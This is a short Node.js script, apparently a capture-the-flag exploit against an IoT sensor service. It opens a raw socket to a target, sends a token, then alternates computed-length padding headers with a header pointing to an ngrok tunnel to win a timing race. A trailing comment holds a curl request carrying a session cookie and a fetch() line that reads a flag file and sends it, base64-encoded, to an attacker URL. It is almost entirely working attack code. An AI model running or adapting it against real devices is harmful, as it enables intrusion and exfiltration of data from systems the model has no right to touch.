var net = require('net');

let token=`${process.env.SENSOR_TOKEN}\n`;

let exampleTsHeader = "ts: 1618700023.548";
let payloadHeader = "location: 3a42e4d82a22.ngrok.io";

let firstWhateverHeader = 'space: ';
while (firstWhateverHeader.length <= 1447) {
  firstWhateverHeader += 'a';
}

let whateverHeader = 'space: ';
while (whateverHeader.length <= 1447 - payloadHeader.length - (exampleTsHeader.length * 2)) {
  whateverHeader += 'a';
}

var client = new net.Socket();

let payload = true;

let sendPayload = () => {
  if (payload) {
    client.write(payloadHeader + '\n\n');
    setTimeout(sendPayload, 200);
  } else {
    client.write(whateverHeader + '\n\n');
    setTimeout(sendPayload, 0);
  }
  payload = !payload;
};

client.connect(parseInt(process.env.SENSOR_PORT), process.env.TARGET_IP, function() {
	console.log('Connected');

  client.write(token);
  client.write(firstWhateverHeader + '\n\n');
});

client.on('data', function(data) {
	console.log('Received: ' + data);
  if (data.toString() === 'ok\n') {
    setTimeout(sendPayload, 0);
  }
});

client.on('close', function() {
	console.log('Connection closed');
});

/*
curl 'http://172.18.0.2/data/snapshot/race' -H 'Connection: keep-alive' -H 'Cookie: -goahead-session-=::webs.session::b48551c3e7a0185515e39a499024a4dc'

fetch('iot.hub/cgi-bin/flag').then(r=>r.text()).then((f)=>fetch('your url' + btoa(f)))
*/